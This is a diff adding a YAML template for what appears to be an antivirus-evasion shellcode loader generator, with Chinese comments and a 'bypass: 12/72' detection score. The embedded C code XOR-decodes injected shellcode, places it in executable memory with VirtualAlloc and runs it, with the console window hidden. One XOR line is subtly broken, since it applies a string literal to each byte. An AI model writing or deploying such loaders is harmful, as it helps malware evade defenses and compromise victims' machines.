@@ -1,0 +1,33 @@
+name: C-EXE-Windows-XOR-Yes-MemoryEnforcement
+time: 1630469471
+bypass: 12/72
+language: c
+build: ~
+process: exe
+set:
+  #下面两个都要从写
+  r1: randoms().XOR()  #随机xor字符
+  xor_shellcode: ShellcodeEncryptionAndDecryption().XOREncryption({{r1}},BinaryDataTypeConversion().StringToBytes(ast.literal_eval(repr(kwargs.get("shellcode")).replace("\\\\", "\\"))))  #执行xor运行
+include:
+  - '#include <windows.h>'
+  - '#include <stdio.h>'
+  - '#include <string.h>'
+pragma:
+  - '#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")'
+define: ~
+class: ~
+function:
+  - |
+    int main()
+    {
+    unsigned char buf[] = "{{xor_shellcode}}";
+    LPVOID Memory;
+    for(int i = 0;i<sizeof(buf); i++)
+    {
+    buf[i] ^= "{{r1}}";
+    }
+    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(Memory, buf, sizeof(buf));
+    ((void(*)())Memory)();
+    return 0;
+
